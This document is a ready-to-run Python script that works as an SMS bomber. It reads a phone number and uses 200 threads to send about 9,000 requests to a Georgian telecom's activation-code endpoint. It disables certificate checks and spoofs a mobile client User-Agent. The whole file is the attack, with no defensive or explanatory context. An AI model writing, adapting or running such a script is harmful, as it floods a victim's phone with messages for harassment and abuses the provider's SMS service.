import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

num = str(input('Enter Number: '))
headers = {
    'Host': 'oauth.magticom.ge',
    'Content-Type': 'application/json',
    # 'Content-Length': '0',
    # 'Accept-Encoding': 'gzip, deflate',
    'User-Agent': 'okhttp/3.10.0',
    'Connection': 'close',
}

params = {
    'userIdentifier': num,
}

def send():
    response = requests.post('https://oauth.magticom.ge/auth/user/activation-code/send', params=params, headers=headers, verify=False)
    print('sms sent')

processes = []
with ThreadPoolExecutor(max_workers=200) as executor:
    for i in range(10,100):
        for j in range(100):
            processes.append(executor.submit(send, ))
